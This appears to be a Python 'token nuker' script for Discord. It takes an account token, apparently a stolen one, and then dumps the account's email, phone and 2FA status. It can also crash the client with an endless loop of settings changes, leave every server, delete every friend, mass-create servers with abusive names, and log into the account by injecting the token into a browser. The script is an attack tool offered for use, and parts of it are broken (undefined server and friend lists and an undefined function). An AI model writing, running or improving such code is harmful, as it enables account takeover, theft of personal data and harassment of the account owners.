import discord
import asyncio
import codecs
import ctypes
import sys
import io
import random
import threading
import requests
import discord
import os
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle


bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

ctypes.windll.kernel32.SetConsoleTitleW(f'Heyo On Top')


print(f"""  
             ██░ ██ ▓█████▓██   ██▓ ▒█████      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
            ▓██░ ██▒▓█   ▀ ▒██  ██▒▒██▒  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
            ▒██▀▀██░▒███    ▒██ ██░▒██░  ██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
            ░▓█ ░██ ▒▓█  ▄  ░ ▐██▓░▒██   ██░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
            ░▓█▒░██▓░▒████▒ ░ ██▒▓░░ ████▓▒░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
            ▒ ░░▒░▒░░ ▒░ ░  ██▒▒▒ ░ ▒░▒░▒░    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
            ▒ ░▒░ ░ ░ ░  ░▓██ ░▒░   ░ ▒ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
            ░  ░░ ░   ░   ▒ ▒ ░░  ░ ░ ░ ▒        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
            ░  ░  ░   ░  ░░ ░         ░ ░              ░    ░     ░  ░      ░  ░   ░     
                          ░ ░          
""")
print('\n')
token = input("Token : ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('[+] Account valid ')
    input("Press any key to continue...")
else:
    print(f'[{Fore.MAGENTA}-{Fore.RESET}] Invalid token')
    input("Press any key to exit...")
    exit(0)



print('\n')
print('1 - token Info')
print('2 - cord crasher')
print('3 - cord destroyer')
print('4 - login')
print('\n')


def tokenInfo(token):
    print('Token Info')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.MAGENTA}User ID{Fore.RESET}]         {userID}
            [{Fore.MAGENTA}User Name{Fore.RESET}]       {userName}
            [{Fore.MAGENTA}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.MAGENTA}Email{Fore.RESET}]           {email}
            [{Fore.MAGENTA}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.MAGENTA}Token{Fore.RESET}]           {token}
            ''')
            input()


def crashdiscord(token):
    print('Token Fucker')
    print('\n')
    print('Crashing token')
    print('stop the tool to stop token fucking')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenFuck(token):
    headers = {'Authorization': token}
    print(f"[{Fore.MAGENTA}+{Fore.RESET}] Polverizing...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    for i in range(100):
        payload = {'name': f'Heyo fucked ur life {i}', 'region': 'europe', 'icon': 'av.png', 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)

    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


def mainanswer():
    answer = input('Choose : ')
    if answer == '0':
        nuke()
    elif answer == '1':
        tokenInfo(token)
    elif answer == '2':
        crashdiscord(token)
    elif answer == '3':
        tokenFuck(token)
    elif answer == '4':
        tokenLogin(token)
    else:
        print('Wrong number dumbass')
        mainanswer()

mainanswer()


